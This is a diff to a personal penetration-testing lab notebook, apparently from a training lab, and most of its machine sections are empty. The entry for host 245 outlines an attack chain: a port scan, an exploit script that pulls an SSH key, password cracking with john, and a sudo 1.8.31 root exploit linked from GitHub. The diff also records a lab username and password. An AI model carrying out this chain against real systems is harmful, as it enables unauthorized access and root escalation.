@@ -1770,6 +1770,7 @@ root
 root@demo:~# cat proof.txt
 cat proof.txt
 da9f3ab53e0c4e9dbeb658a565ebff82
+
 ```
 
 
@@ -2342,3 +2343,82 @@ index 77e370c..0000000
 
 ```
 ## 250
+
+
+
+
+
+
+## Revision 
+245 > 246 > 247 > 248 > 249 > 189/14/191 > 7 > 15 > 19 > 20 > 21
+
+
+## User
+```
+anita
+```
+## Pass
+```
+fireball
+
+```
+
+## 6 
+```
+```
+## 7 
+```
+```
+## 14 
+```
+```
+## 15 
+```
+```
+## 19 
+```
+```
+## 20 
+```
+```
+## 21 
+```
+```
+## 189 
+```
+```
+## 191 
+```
+```
+## 245
+```
+21/tcp   open  ftp          syn-ack                                                80/tcp   open  http         syn-ack                                                443/tcp  open  https        syn-ack                                               2222/tcp open  EtherNetIP-1 syn-ack                                                8000/tcp open  http-alt     syn-ack
+
+sudo ./50383.sh targets.txt /home/anita/.ssh/id_ecdsa
+
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt anita.hash 
+
+sudo ssh -i anita_rsa anita@192.168.192.245 -p 2222
+local.txt 
+linpeas.sh (sudo 1.8.31 vulnerable)
+https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
+transer full file
+make
+./exploit
+proof.txt
+```
+## 246 
+```
+```
+## 247 
+```
+```
+## 248 
+```
+```
+## 249 
+```
+```
+## 250 
+```
+```
